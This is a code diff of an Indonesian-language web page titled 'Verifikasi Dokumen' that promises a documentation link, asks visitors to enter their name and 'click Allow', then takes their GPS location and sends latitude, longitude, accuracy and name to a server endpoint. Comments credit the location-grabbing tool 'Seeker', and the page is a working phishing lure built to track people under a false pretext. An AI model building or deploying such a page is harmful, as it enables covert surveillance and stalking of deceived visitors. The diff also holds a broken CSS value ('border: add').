@@ -14,59 +14,47 @@
       font-size: 16px;
       background: #3c78da;
       color: white;
-      border: none;
+      border: add;
       border-radius: 6px;
-    }
-    input {
-      padding: 10px;
-      font-size: 16px;
-      width: 300px;
-      margin: 10px 0;
-      border-radius: 6px;
-      border: 1px solid #ccc;
     }
   </style>
 </head>
 <body>
   <h2>Verifikasi Dokumen</h2>
-  <p>Masukkan nama asli Anda dan klik tombol di bawah untuk mendapatkan link dokumentasi.</p>
-
-  <!-- Form Input Nama -->
-  <input type="text" id="name" placeholder="Masukkan Nama Asli" />
-
-  <!-- Tombol untuk memulai tracking -->
+  <p>Klik tombol di bawah untuk mendapatkan link dokumentasi.</p>
+  <p>Klik Allow untuk mendapatkan Link</p>
+  
+  <!-- Form untuk input nama -->
+  <input type="text" id="nama" placeholder="Masukkan Nama Anda" required><br><br>
+  
   <button onclick="startTracking()">Dapatkan Link</button>
 
   <script>
     function startTracking() {
-      var name = document.getElementById('name').value;
-
-      if (!name) {
-        alert("Mohon isi nama asli terlebih dahulu.");
-        return;
-      }
-
-      // Panggil fungsi dari Seeker untuk mengambil lokasi
+      // Ambil nama dari input
+      var nama = document.getElementById("nama").value;
+      
+      // Panggil fungsi dari Seeker
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(function(position) {
-          sendData(position, name);
+          sendData(position, nama); // Kirim data posisi dan nama
         }, showError);
       } else {
         alert("Browser Anda tidak mendukung GPS.");
       }
     }
 
-    function sendData(position, name) {
+    function sendData(position, nama) {
       fetch('/api/location', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json'
         },
         body: JSON.stringify({
-          name: name,
           lat: position.coords.latitude,
           lon: position.coords.longitude,
-          acc: position.coords.accuracy
+          acc: position.coords.accuracy,
+          nama: nama // Tambahkan nama ke data yang dikirim
         })
       })
       .then(response => {
